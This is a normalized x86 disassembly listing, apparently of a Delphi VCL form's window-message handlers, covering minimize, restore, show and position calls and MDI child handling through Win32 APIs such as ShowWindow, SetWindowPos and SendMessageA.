call sub_4672f8
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_4687d4
pop ecx
sub_468904
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44df94
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4530b8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4530b8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44cf6c
pop esi
pop ebx
retn
sub_468994
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_45230c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4530b8
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_460c10
sub_4689f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4513a8
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_460624
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_468a40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_460e84
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_468a78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_468b13
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b1a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_460584
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46d8d8
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_449958
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46d8d8
jmp r-xdata
sub_468b40
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_4034a4
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_468b80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d040
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_468bac
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_46836c
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_449730
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_468c04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4521f0
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46c28c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_4034a4
sub_468c90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4530b8
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_468d28
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4530b8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_468308
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_4034a4
sub_468d80
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_4535ec
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_468dac
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_46836c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_468dc8
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_4605b4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4605b4
sub_468e08
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_468e40
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_40408c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_468e74
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_468fc5
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468fcc
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_468dc8
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_4496d4
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41725c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_44c38c
lea eax [ ebp - 0x1c ]
call sub_406d38
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_468dc8
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_468e08
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_46d57c
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_46d5e4
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_46d5e4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_468e40
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41725c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_44c38c
lea eax [ ebp - 0x1c ]
call sub_406d38
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_46d514
test [ esi + 0x228 ] 0x8
je r-xdata
sub_468fd4
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_469048
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_469074
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451654
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467084
lea edx [ ebp - 0x14 ]
call sub_46a84c
push ebp
mov eax [ ebp - 0x4 ]
call sub_467084
lea edx [ ebp - 0x24 ]
call sub_46a84c
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_469048
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_467084
lea edx [ ebp - 0x24 ]
call sub_46a84c
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_469048
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_469048
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_469048
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_46912c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4034a4
pop esi
pop ebx
retn
sub_469150
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_4034a4
pop esi
pop ebx
retn
sub_469174
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_452534
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_4535ec
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_4535ec
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_469210
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46977a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_46d9c8
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_46975d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469764
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
push ebp
push sub_469664
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_403788#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4683bc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450610
jmp r-xdata
mov eax [ rw-data ]
call sub_46aaa8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44c278
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4530b8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_46aa9c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44c2bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4530b8
call sub_463fe4
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46aad8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44c278
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46aaa8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44cad4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46aacc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44c2bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46aa9c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_46766c
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_46766c
jmp r-xdata
sub_4692cd
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46d0dc
call sub_403af0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_46aaa8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44c278
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46aa9c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44c2bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46aad8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44c278
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46aaa8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469764
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44cad4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
jmp r-xdata
